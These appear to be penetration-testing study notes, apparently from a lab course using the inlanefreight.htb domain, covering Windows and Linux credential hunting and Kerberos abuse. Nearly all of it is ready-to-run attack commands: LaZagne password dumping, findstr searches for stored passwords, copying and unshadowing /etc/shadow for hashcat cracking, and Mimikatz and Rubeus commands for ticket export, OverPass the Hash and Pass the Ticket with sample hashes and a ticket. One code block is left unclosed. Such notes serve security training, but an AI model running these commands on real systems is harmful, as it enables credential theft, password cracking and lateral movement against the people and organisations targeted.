## LaZagne
https://github.com/AlessandroZ/LaZagne  
The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer. Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). This tool has been developed for the purpose of finding these passwords for the most commonly-used software.
```
lazagne.exe all -vv
```
> `-vv` for verbose 


## Additional Considerations

There are thousands of tools & key terms we could use to hunt for credentials on Windows operating systems. Know that which ones we choose to use will be primarily based on the function of the computer. If we land on a Windows Server OS, we may use a different approach than if we land on a Windows Desktop OS. Always be mindful of how the system is being used, and this will help us know where to look. Sometimes we may even be able to find credentials by navigating and listing directories on the file system as our tools run.

Here are some other places we should keep in mind when credential hunting:

* Passwords in Group Policy in the SYSVOL share
* Passwords in scripts in the SYSVOL share
* Password in scripts on IT shares
* Passwords in web.config files on dev machines and IT shares
* unattend.xml
* Passwords in the AD user or computer description fields
* KeePass databases --> pull hash, crack and get loads of access.
* Found on user systems and shares
* Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint


## findstr
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Passwd, Shadow & Opasswd

`/etc/security/opasswd`  

Unshadow
```
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

crack unshadowed hashes
```
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

## Harvesting Kerberos Tickets from Windows

Mimikatz - Export Tickets
```
sekurlsa::tickets /export
```

Rubeus - Export Tickets
```
Rubeus.exe dump /nowrap
```

> This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the OverPass the Hash or Pass the Key technique.

## Pass the Key or OverPass the Hash

The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT).

Mimikatz - Extract Kerberos Keys
```
sekurlsa::ekeys
```

Mimikatz - Pass the Key or OverPass the Hash
```
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

Rubeus - Pass the Key or OverPass the Hash
```
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
> Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

## Pass the Ticket (PtT)

Rubeus Pass the Ticket
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Rubeus - Pass the Ticket
```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

Pass the Ticket - Base64 Format
```
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
